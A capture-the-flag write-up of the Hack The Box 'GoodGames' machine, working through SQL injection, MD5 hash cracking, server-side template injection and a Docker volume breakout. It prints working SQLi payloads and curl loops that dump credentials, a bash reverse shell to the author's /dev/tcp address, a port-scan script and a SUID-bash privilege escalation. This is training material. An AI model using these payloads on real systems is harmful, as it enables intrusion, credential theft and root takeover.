---
layout: post
title:  "GoodGames Writeup - Hack The Box"
date:   2023-11-29
desc: "SQL Injection (Error Based), Hash Cracking, Server Side Template Injection, Docker Breakout"
keywords: "HTB,OSCP,eCPPTv2,eJPT,eWPT,Linux,SSTI,SQLi,DockerBreakout,HashCracking,Easy"
categories: [HTB]
tags: [HTB,OSCP,eCPPTV2,eJPT,eWPT,Linux,SSTI,SQLi,DockerBreakout,HashCracking,Easy]
icon: icon-htb
---

> **Disclaimer:** The ***writeups*** that I do on the different machines that I try to vulnerate, cover all the actions that I perform, even those that could be considered wrong, I consider that they are an essential part of the **learning curve** to become a **good professional**. So it can become very extensive content, if you are looking for something more direct, you should look for another site, there are many and of higher quality and different resolutions, moreover, I advocate that it is part of learning to consult different sources, to obtain greater expertise.

I continue with a small saga of Linux Machines, now it's the turn of the **GoodGames** box from [Hack The Box](https://www.hackthebox.com/){:target="_blank"}, classified as **Easy**, it doesn't require much research but it requires some previous knowledge of **Docker**, volumes in this case. **SQLi** and **SSTI** injections are also going to help me, so to remember or review the basics and those to get a **RCE**. Here I go in search of new knowledge and strengthen the ones that are stored in my long term memory.

<br/><br/>
<img src="{{ site.img_path }}/goodgames_writeup/GoodGames.png" width="100%" style="margin: 0 auto;display: block
; max-width: 400px;">
<br/><br/>

I start by deploying the box with **[htbExplorer](https://github.com/s4vitar/htbExplorer){:target="_blank"}**, a tool that allows you to manage from the console and avoid entering the **[Hack The Box](https://www.hackthebox.com/){:target="_blank"}** web to perform the actions I need to do. I verify the connectivity and check the **Operating System** of the box, everything is working correctly, if I do a port enumeration with `nmap`, I see that there is only one, with the **TCP** protocol of course, there may be others under **UDP** or others.

```bash
./htbExplorer -d GoodGames
```

```bash
sudo nmap -sS --min-rate 5000 -p- --open -vvv -n -Pn 10.10.11.130 -oG allPorts
```
<br/>
<img src="{{ site.img_path }}/goodgames_writeup/GoodGames_00.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

I continue to use `nmap` to learn more about the service offered on port **80** on the victim machine. With the basic reconnaissance scripts, I obtain information that allows me to know the **Codename** of the machine, **Jammy**, I can also visualize the technologies used in the web service with `whatweb`. I get a domain, which I immediately add to my lists of known hosts and scan them again with `whatweb`, just to see if the **URL** is resolving properly. No relevant information at the moment.

```bash
nmap -sCV -p80 10.10.11.130 -oN targeted

cat targeted
# Apache httpd 2.4.51
# duckduckgo.com --> Apache httpd 2.4.51 launchpad      Jammy!

# --> goodgames.htb

whatweb http://10.10.11.130
nvim /etc/hosts
whatweb http://goodgames.htb
```

<br/>
<img src="{{ site.img_path }}/goodgames_writeup/GoodGames_01.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/goodgames_writeup/GoodGames_02.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/goodgames_writeup/GoodGames_03.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

If I access the web page using the **IP** and the **domain**, I see no difference, it seems that **Virtual Hosting** is not being used. I am allowed to sign-up, so there is no need for a brute force attack at the moment when sign-in. Once sign-up, I sign-in and I see that my user is displayed on the screen at various times, I also see that the **Flask** framework, so it is a great indication for a possible **[SSTI](https://portswigger.net/web-security/server-side-template-injection){:target="_blank"}** attack. If I browse the website a little I only find a subscription form, but it does not work.

> **[Flask](https://pythonbasics.org/what-is-flask-python/){:target="_blank"}** is a web framework, it’s a Python module that lets you develop web applications easily. It’s has a small and easy-to-extend core: it’s a microframework that doesn’t include an ORM (Object Relational Manager) or such features. It does have many cool features like url routing, template engine. It is a WSGI web app framework.

<br/>
<img src="{{ site.img_path }}/goodgames_writeup/GoodGames_04.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/goodgames_writeup/GoodGames_05.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/goodgames_writeup/GoodGames_06.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/goodgames_writeup/GoodGames_07.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/goodgames_writeup/GoodGames_08.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

I can use some basic **SSTI** injections in **[Payload All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection){:target="_blank"}** when sign-up a new user, but the results on the screen are not what I expected to find. It shows the username as I entered it, the special characters must be escaping and are not interpreted by the server.

<br/>
<img src="{{ site.img_path }}/goodgames_writeup/GoodGames_09.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/goodgames_writeup/GoodGames_10.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/goodgames_writeup/GoodGames_11.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

If I search for an exploit with `searchsploit` using as search parameter, the name of the Web Service I find nothing, neither if I search for directories with `nmap`. The other possible way is to investigate the request sent to the server when I log in to try some other attack vectors.

```bash
nmap --script http-enum -p80 10.10.11.130 -oN webScan

searchsploit good games
searchsploit goodgames
```

<br/>
<img src="{{ site.img_path }}/goodgames_writeup/GoodGames_12.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/goodgames_writeup/GoodGames_13.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

I run `burspuite` in the background and capture the request I am interested in. If I inject a basic query to try to bypass the sign-in, it succeeds, the first thing that strikes me is that the list of registered users is displayed on the screen, there is the `admin` user. Navigating in the page, I find a new **Configurations** page, but it redirects to a subdomain that I don't have registered at the moment.

```bash
burpsuite &> /dev/null &
```

> **Burpsuite Proxy**

```sql
email=oldboy%40oldb.htb'+or+1=1--+-&password=oldboy123
```

<br/>
<img src="{{ site.img_path }}/goodgames_writeup/GoodGames_14.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/goodgames_writeup/GoodGames_15.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/goodgames_writeup/GoodGames_16.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/goodgames_writeup/GoodGames_17.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

I add the subdomain I found and check that it is resolving well, then I use `whatweb` to see if it shows me any additional information, but nothing worth investigating further. If I try to sign-in as the user I registered in the first instance it doesn't let me, I can't find anything in the source code either, like hardcoded credentials.

```bash
nvim /etc/hosts
ping -c 1 http://internal-administration.goodgames.htb/
whatweb http://internal-administration.goodgames.htb/
```

<br/>
<img src="{{ site.img_path }}/goodgames_writeup/GoodGames_18.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/goodgames_writeup/GoodGames_19.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/goodgames_writeup/GoodGames_20.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

I'm going to use `wfuzz` to search directories in the new subdomain, to see if I can find an administrative panel, but I can't find anything, maybe with another bigger dictionary, but for now no. I remember I have the **[SQLi](https://portswigger.net/web-security/sql-injection){:target="_blank"}** attack vector available, so I'm going to use BurpSuite's **Repeater** tool to enumerate the databases. I try with basic injections but I have no luck, not only I look if something is shown in the response but also in its ***length***, any anomaly can help me. But I get the result after a while with an injection that performs a query using **ORDER BY**.

```bash
wfuzz -c --hc=404 --hh=6672 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt http://internal-administration.goodgames.htb/FUZZ
```

```sql
email=oldboy%40oldb.htb'&password=oldboy123
email=oldboy%40oldb.htb'+and+sleep+5--+-&password=oldboy123
email=oldboy%40oldb.htb'+order+by+50--+-&password=oldboy123         # Content-Length: 33490
email=oldboy%40oldb.htb'+order+by+4--+-&password=oldboy123          # Content-Length: 9267          :):)
```

<br/>
<img src="{{ site.img_path }}/goodgames_writeup/GoodGames_21.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/goodgames_writeup/GoodGames_22.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/goodgames_writeup/GoodGames_23.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/goodgames_writeup/GoodGames_24.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

Now that I know the injection is working, look in the **body** of the **Response** to show the results of the queries and find it. Now I use other injections, to get the user, name, database version. With other injections a little more complex I get the database and the tables, which are many, so it is better to list them one by one.

```sql
email=oldboy%40oldb.htb'+union+select+1,2,3,4--+-&password=oldboy123
# Welcome oldboy4
email=oldboy%40oldb.htb'+union+select+1,2,3,user()--+-&password=oldboy123
# Welcome oldboymain_admin@localhost
email=oldboy%40oldb.htb'+union+select+1,2,3,database()--+-&password=oldboy123
# Welcome oldboymain
email=oldboy%40oldb.htb'+union+select+1,2,3,version()--+-&password=oldboy123
# Welcome oldboy8.0.27
email=oldboy%40oldb.htb'+union+select+1,2,3,schema_name+from+information_schema.schemata--+-&password=oldboy
# Welcome oldboyinformation_schemamain
email=oldboy%40oldb.htb'+union+select+1,2,3,table_name+from+information_schema.tables--+-&password=oldboy123
# ....... so many!!
email=oldboy%40oldb.htb'+union+select+1,2,3,table_name+from+information_schema.tables+limit+0,1--+-&password=oldboy123
email=oldboy%40oldb.htb'+union+select+1,2,3,table_name+from+information_schema.tables+limit+1,1--+-&password=oldboy123
# Welcome oldboyADMINISTRABLE_ROLE_AUTHORIZATIONS
```

<br/>
<img src="{{ site.img_path }}/goodgames_writeup/GoodGames_25.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/goodgames_writeup/GoodGames_26.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/goodgames_writeup/GoodGames_27.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/goodgames_writeup/GoodGames_28.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/goodgames_writeup/GoodGames_29.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

I keep injecting malicious queries to get more information from the **main** database, I find the tables and then the columns that I think are the most important to access the machine, I find credentials that are the username and a hash. But if I try to know the type of hash that is with `hashid` or with `hash-identifier` it does not recognize it, another thing that I can observe at the time of obtaining the values of the columns, is that there are letters that were suppressed, something makes me think that `tr` is doing something strange.

```bash
curl -s -X POST http://goodgames.htb/login -H "Content-Type: application/x-www-form-urlencoded" -d "email=oldboy%40oldb.htb'+union+select+1,2,3,table_name+from+information_schema.tables+limit+0,1--+-&password=oldboy123" | grep Welcome | sed 's/^ *//' | awk 'NF{print $NF}' | tr -d '</h2>'
curl -s -X POST http://goodgames.htb/login -H "Content-Type: application/x-www-form-urlencoded" -d "email=oldboy%40oldb.htb'+union+select+1,2,3,table_name+from+information_schema.tables+limit+1,1--+-&password=oldboy123" | grep Welcome | sed 's/^ *//' | awk 'NF{print $NF}' | tr -d '</h2>'

for i in $(seq 1 100); do curl -s -X POST http://goodgames.htb/login -H "Content-Type: application/x-www-form-urlencoded" -d "email=oldboy%40oldb.htb'+union+select+1,2,3,table_name+from+information_schema.tables+limit+$i,1--+-&password=oldboy123" | grep Welcome | sed 's/^ *//' | awk 'NF{print $NF}' | tr -d '</h2>'; done

for i in $(seq 0 100); do echo -e "[+] Number $i: $(curl -s -X POST http://goodgames.htb/login -H "Content-Type: application/x-www-form-urlencoded" -d "email=oldboy%40oldb.htb' union select+1,2,3,schema_name from information_schema.schemata limit $i,1-- -&password=oldboy123" | grep Welcome | sed 's/^ *//' | awk 'NF{print $NF}' | tr -d '</h2>')"; done

for i in $(seq 1 100); do echo -e "[+] Number $i: $(curl -s -X POST http://goodgames.htb/login -H "Content-Type: application/x-www-form-urlencoded" -d "email=oldboy%40oldb.htb' union select+1,2,3,table_name from information_schema.tables where table_schema=\"main\" limit $i,1-- -&password=oldboy123" | grep Welcome | sed 's/^ *//' | awk 'NF{print $NF}' | tr -d '</h2>')"; done

for i in $(seq 1 100); do echo -e "[+] Number $i: $(curl -s -X POST http://goodgames.htb/login -H "Content-Type: application/x-www-form-urlencoded" -d "email=oldboy%40oldb.htb' union select+1,2,3,column_name from information_schema.columns where table_schema=\"main\" and table_name=\"user\" limit $i,1-- -&password=oldboy123" | grep Welcome | sed 's/^ *//' | awk 'NF{print $NF}' | tr -d '</h2>')"; done

curl -s -X POST http://goodgames.htb/login -H "Content-Type: application/x-www-form-urlencoded" -d "email=oldboy%40oldb.htb' union select+1,2,3,group_concat(name,0x3a,email,0x3a,password) from user-- -&password=oldboy123" | grep Welcome | sed 's/^ *//' | awk 'NF{print $NF}' | tr -d '</h2>'
```

<br/>
<img src="{{ site.img_path }}/goodgames_writeup/GoodGames_30.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/goodgames_writeup/GoodGames_31.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/goodgames_writeup/GoodGames_32.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/goodgames_writeup/GoodGames_33.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/goodgames_writeup/GoodGames_34.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

If instead of `tr` I use `awk`, I get the complete information, I can check that the hash type is **MD5**. But before I try to break it, I check its length, `wc` tells me that it has 33 characters, which means that I must suppress the line break, because a MD5 hash has 32. Once I do this, I can use `john` or even **[Crackstation](https://crackstation.net/){:target="_blank"}** to get the password.

```bash
curl -s -X POST http://goodgames.htb/login -d "email=oldboy%40oldb.htb' union select 1,2,3,group_concat(name,0x3a,email,0x3a,password) from user-- -&password=oldboy123" | grep Welcome | sed 's/^ *//' | awk 'NF{print $NF}' | awk '{print $1}' FS='<'

hashid 2b22337f218b2d82dfc3b6f77e7cb8ec
hash-identifier

cat hash | wc -c
cat hash | tr -d '\n' | sponge hash
cat hash | wc -c

john --list=formats
john -w:/usr/share/wordlists/rockyou.txt hash --format=Raw-MD5
john -show hash
```

<br/>
<img src="{{ site.img_path }}/goodgames_writeup/GoodGames_35.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/goodgames_writeup/GoodGames_36.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/goodgames_writeup/GoodGames_37.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

I try to access with the credentials I just obtained to the subdomain and I succeed. Immediately I see that I have access to the **Settings** panel, to see if I can update data to be reflected on the web page, I modify the **username** and when I save the changes my changes are seen. I verify that the server is vulenerable to **[SSTI](https://portswigger.net/web-security/server-side-template-injection){:target="_blank"}**, to do this I resort to **[Payload All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection){:target="_blank"}** to test basic injections and I succeed!

<br/>
<img src="{{ site.img_path }}/goodgames_writeup/GoodGames_38.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/goodgames_writeup/GoodGames_39.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/goodgames_writeup/GoodGames_40.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/goodgames_writeup/GoodGames_41.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/goodgames_writeup/GoodGames_42.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

It is time to try to get a **Reverse Shell**, exploiting the **SSTI** vulnerability, I just have to create an `index.html` file, with `bash` code to send a shell to my attacker machine. Then I will set up a local server with `python3` and listen in with `nc`. I perform the injection by updating the username and that's it, I have access to the victim machine. I do a console treatment for better mobility, but I notice with `hostname` that the system's DNS name corresponds to that of a container and if I look at the network interfaces, the IP value corresponds to that of a container.

> **`hostname`** is used to display the system's DNS name, and to display or set its hostname or NIS domain name. -I Parameter Display  all network addresses of the host.

```bash
nvim index.html
python3 -m http.server 80
nc -nlvp 443
```

> **index.html**

```bash
#!/bin/bash

bash -c 'bash -i >& /dev/tcp/10.10.14.15/443 0>&1'
```

```bash
script /dev/null -c bash                # [Ctrl+z]
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
stty rows 29 columns 128

whoami
hostname
hostname -I
ifconfig
ip a
```

<br/>
<img src="{{ site.img_path }}/goodgames_writeup/GoodGames_43.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/goodgames_writeup/GoodGames_44.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/goodgames_writeup/GoodGames_45.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

If I look at the IP routing tables, I find in the gateway the value of an IP that must be the real victim machine, and I have connectivity to this IP. But if I enumerate the container a bit I don't find much information on how to access it.

> **`route`** manipulates the kernel's IP routing tables. -n Parameter show numerical addresses instead of trying to determine symbolic host names. This is useful if you are trying to determine why the route to your nameserver has vanished.

```bash
env
cat .dockerenv
route -n
# -> inet 172.17.0.1        eth0 (docker)

ping -c 1 172.19.0.1                # Active!
# This interface should communicate with the victim machine.!!
```

<br/>
<img src="{{ site.img_path }}/goodgames_writeup/GoodGames_46.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/goodgames_writeup/GoodGames_47.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

If I access the **Home** directory of the container, I find the directory of a user `augustus`, and I can already access the first flag. But this user does not exist in the `passwd` file, which makes me think that a volume of the **Home** directory of the user of the real machine must have been mounted in the container, with the command `mount` and `df` I check that it is so.

```bash
cd /home
ls
# --> august ?
grep "augustus" /etc/passwd
grep "sh$" /etc/passwd              --> only root

ls -l user.txt
# --> -rw-r----- root 1000      group 1000?
# --> A mount must be used on this machine!!

mount
mount | grep home
# --> /dev/sda1 on /home/augustus type ext4 ...

fdisk -l            # :(
df -h
# --> /dev/sda1  --> /home/augustus
```

<br/>
<img src="{{ site.img_path }}/goodgames_writeup/GoodGames_48.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/goodgames_writeup/GoodGames_49.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/goodgames_writeup/GoodGames_50.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

Since I know I have connectivity to the possible real machine, I can create a script to see what ports it has open. But in the container I don't have binaries like `vi` or `nano` to edit the script, so I create it on my attacker machine and transfer it to the container, when I run it I find port **22** and **80**. If I try to connect using **SSH** and reusing the credentials I found for the web service, I access or the real machine finally.

> **Attacker Machine**:

```bash
nvim port_discovery.sh

base64 -w 0 port_discovery.sh | xclip -sel clip
```

> **Victime Machine**:

```bash
echo "..." | base64 -d > port_discovery.sh
chmod +x port_discovery.sh
./port_discovery.sh
# --> Port 22 - OPEN
# --> Port 80 - OPEN

ssh augustus@172.19.0.1

hostname -I
# --> 10.10.11.130 172.19.0.1 172.17.0.1
```

> **port_discovery.sh**

```bash
#!/bin/bash

function ctrl_c(){
  echo -e "\n\n[!] Exiting ...\n"
  tput cnorm; exit 1
}

# Ctrl+c
trap ctrl_c INT

tput civis
for port in $(seq 1 65535); do
  timeout 1 bash -c "echo '' > /dev/tcp/172.19.0.1/$port" 2>/dev/null && echo "[+] Port $port - OPEN" &
done; wait
tput cnorm
```

<br/>
<img src="{{ site.img_path }}/goodgames_writeup/GoodGames_51.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/goodgames_writeup/GoodGames_52.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/goodgames_writeup/GoodGames_53.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

If I enumerate a bit the victim machine, many of the commands I can't find, if I look at the **PATH** it has configured, it doesn't contemplate many directories, so I export the one of my attacker machine. Now that I can enumerate, I perform the basic reconnaissance commands but I can't find anything at the moment.

```bash
sudo -l
# --> command not found

ifconfig
# --> command not found :(

export PATH=......                  # (my PATH!)

ifconfig
# --> br-99993f3f3b6b: .... inet 172.19.0.1

find \-perm -4000 2>/dev/null
getcap -r / 2>/dev/null

id
# I'm not in docker group!

uname -a
# --> Debian GNU/Linux 11
lsb_releas -a
# --> bullseye

cat /etc/crontab
```

<br/>
<img src="{{ site.img_path }}/goodgames_writeup/GoodGames_54.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/goodgames_writeup/GoodGames_55.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/goodgames_writeup/GoodGames_56.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/><br/>

As I find no vulnerabilities, I think I should take advantage of the container and the mounted volume. Then an idea for privilege escalation, is to copy the `bash` binary in the home of the user `augustus`. Now I go back to the container where I am the `root` user, then I can make all the changes I want. First I change the user and group owner of the `bash` binary to `root` and also assign **SUID** permissions. I just need to access again to the real victim machine with **SSH** and run the `bash` binary with modified permissions, and with the `-p` parameter to give me a shell as the owner user, in this case, `root`. Finally I was able to route the box

```bash
cd /home/augustus
cp /bin/bash .

exit

# Continer
cd /home/augustus
ls -l
# --> -rwxr-xr-x 1 1000 1000 bash

chown root:root bash
chmod 4755 bash
ls -l
# --> -rwsr-xr-x 1 root root bash          SUID!!

ssh augustus@172.19.0.1

cd /home/augustus
ls -l
# --> -rwsr-xr-x 1 root root bash          :)

./bash -p
```

<br/>
<img src="{{ site.img_path }}/goodgames_writeup/GoodGames_57.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/goodgames_writeup/GoodGames_58.png" width="100%" style="margin: 0 auto;display: block
; max-width: 900px;">
<br/>

> What a great box, I love it when technologies and different concepts are combined. Privilege escalation many times are challenging to the mind and not so much for research. I will now continue the saga and look for another challenge. I must not forget to kill the box with `htbExplorer`.

```bash
./htbExplorer -k GoodGames
```
